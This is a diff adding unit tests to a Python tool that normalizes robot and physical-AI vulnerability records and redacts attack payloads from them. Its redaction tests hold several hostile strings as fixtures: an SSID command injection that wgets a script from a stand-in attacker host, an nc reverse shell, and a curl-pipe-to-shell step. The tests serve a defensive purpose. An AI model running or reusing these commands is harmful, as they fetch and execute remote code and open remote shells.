@@ -24,11 +24,13 @@ def base_record(**over):
             "attack_surface": ["network"],
             "vulnerability_class": ["RCE"],
         },
-        "attack_chain": {"steps": ["a"]},
+        "attack_chain": {"preconditions": [], "steps": ["1. a", "2. b"], "physical_consequence": "stop"},
         "impact": {"confidentiality": "HIGH"},
         "security_observations": {"root_cause": "x"},
         "cross_domain_tags": ["t"],
-        "mitigation": {"patch_available": True},
+        "mitigation": {"patch_available": True, "fixed_version": None, "workaround": None, "fix_description": "upgrade"},
+        "mapping_to_pavt": {"primary_domain": "Industrial Robot", "secondary_domains": []},
+        "enrichment": {"method": "curated", "reviewed": True},
     }
     rec.update(over)
     return rec
@@ -174,3 +176,82 @@ class PlaceholderAffectedTests(unittest.TestCase):
         out, changes = normalize(rec)
         self.assertEqual(len(out["affected_configurations"]), 1)
         self.assertTrue(any("placeholder" in c for c in changes))
+
+
+class LegacyShapeTests(unittest.TestCase):
+    def test_paths_attack_chain_canonicalized(self):
+        from faultline.normalize import canonical_attack_chain
+        ac = {"paths": [
+            {"path_id": "A", "name": "Main", "attack_vector": "adjacent Wi-Fi",
+             "steps": [{"step": 1, "description": "join network"}, {"step": 2, "description": "send packet"}],
+             "physical_consequence": "robot stops"},
+            {"id": "B", "label": "Alt", "steps": ["1. other", "2. thing"]},
+        ]}
+        out, changed = canonical_attack_chain(ac)
+        self.assertTrue(changed)
+        self.assertEqual(out["steps"], ["1. join network", "2. send packet"])
+        self.assertEqual(out["preconditions"], ["adjacent Wi-Fi"])
+        self.assertEqual(out["physical_consequence"], "robot stops")
+        self.assertEqual(out["name"], "Main")
+        self.assertEqual(out["alternate_paths"][0]["name"], "Alt")
+        self.assertEqual(out["alternate_paths"][0]["steps"], ["1. other", "2. thing"])
+        # idempotent
+        again, changed2 = canonical_attack_chain(dict(out))
+        self.assertFalse(changed2)
+
+    def test_mitigation_variants(self):
+        from faultline.normalize import canonical_mitigation
+        m, _ = canonical_mitigation({"description": "Upgrade.", "patch": {"available": True, "url": "https://x/commit/1", "description": "Fix adds check."}})
+        self.assertEqual(m["patch_available"], True)
+        self.assertEqual(m["fix_description"], "Upgrade.")
+        self.assertEqual(m["references"], ["https://x/commit/1"])
+        m, _ = canonical_mitigation({"short_term": "Upgrade to 2.3.0.", "long_term": "Allowlist types."})
+        self.assertEqual(m["fix_description"], "Upgrade to 2.3.0.")
+        self.assertIn("Long term: Allowlist types.", m["notes"])
+        m, _ = canonical_mitigation({"patch_available": True, "workaround": "w", "fix_versions": ["7.5.0", "7.3.0.7"]})
+        self.assertEqual(m["fixed_version"], "7.5.0, 7.3.0.7")
+        m, _ = canonical_mitigation({"official_fix": None, "workaround": "isolate", "detection": "watch ports"})
+        self.assertIsNone(m["patch_available"]); self.assertEqual(m["detection"], "watch ports")
+        m, changed = canonical_mitigation(None)
+        self.assertTrue(changed); self.assertEqual(set(m), {"patch_available", "fixed_version", "workaround", "fix_description"})
+        canon = {"patch_available": False, "fixed_version": None, "workaround": None, "fix_description": "x"}
+        self.assertEqual(canonical_mitigation(dict(canon)), (canon, False))
+
+    def test_primary_domain_follows_confidence(self):
+        from faultline.normalize import normalize
+        rec = {"cve_id": "CVE-2024-0001", "taxonomy": {"physical_ai_domain": [
+                   {"domain": "Industrial Robot", "confidence": 0.4, "rationale": "r"},
+                   {"domain": "Cross-Domain Components", "confidence": 0.9, "rationale": "r"}]},
+               "mapping_to_pavt": {"primary_domain": "Industrial Robot", "secondary_domains": ["Cross-Domain Components"]}}
+        out, changes = normalize(rec)
+        self.assertEqual(out["mapping_to_pavt"]["primary_domain"], "Cross-Domain Components")
+        self.assertEqual(out["mapping_to_pavt"]["secondary_domains"], ["Industrial Robot"])
+        self.assertEqual(out["enrichment"], {"method": "curated", "reviewed": True})
+
+
+class PayloadRedactionTests(unittest.TestCase):
+    def test_payload_removed_concept_kept(self):
+        from faultline.normalize import _redact_payload, contains_payload
+        s = 'Attacker sets ssid to a shell injection payload, e.g.: ";$(wget http://attacker.host/b.sh -O /tmp/b.sh);#" then connects'
+        out = _redact_payload(s)
+        self.assertFalse(contains_payload(out))
+        self.assertIn("shell injection", out)
+
+    def test_benign_text_unchanged(self):
+        from faultline.normalize import _redact_payload
+        s = "Attacker publishes a crafted geometry_msgs/PoseWithCovarianceStamped message to /initialpose"
+        self.assertEqual(_redact_payload(s), s)
+
+    def test_stubborn_step_fully_redacted(self):
+        from faultline.normalize import _redact_payload, contains_payload
+        out = _redact_payload("3. run nc -e /bin/sh 10.0.0.1 4444 ;# 0xdeadbeef")
+        self.assertFalse(contains_payload(out))
+        self.assertTrue(out.startswith("3."))
+
+    def test_schema_rejects_payload(self):
+        import json, pathlib
+        from faultline.schema import validate
+        rec = json.loads(pathlib.Path("CVE-json").glob("*.pavd.json").__next__().read_text())
+        rec["attack_chain"]["steps"] = ["1. do a thing", "2. run $(curl http://evil/x|sh)"]
+        errors, _ = validate(rec)
+        self.assertTrue(any("payload" in e for e in errors))
